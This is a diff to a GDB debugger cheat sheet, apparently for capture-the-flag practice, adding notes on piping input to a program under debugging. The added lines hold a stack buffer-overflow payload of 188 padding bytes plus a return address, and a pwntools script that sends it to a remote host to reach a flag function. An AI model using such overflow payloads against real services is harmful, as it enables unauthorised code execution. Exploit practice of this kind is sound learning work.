@@ -8,6 +8,19 @@ GDB is a source-level debugger, capable of breaking programs at any specific lin
 
 	gdb -q <elf_executable>
 
+	
+Pass input to exe being debugged
+
+	python3 -c "import sys; sys.stdout.buffer.write(b'A'*188+b'\xe2\x91\x04\x08')"
+
+Pass input using python pwn
+
+	from pwn import *
+	payload = b"A"*188 + p32(flag_address)
+	p = remote(host_ip, port)
+	p.sendline(payload)
+	p.interactive()
+
 ## commands
 
 Disassemble a function
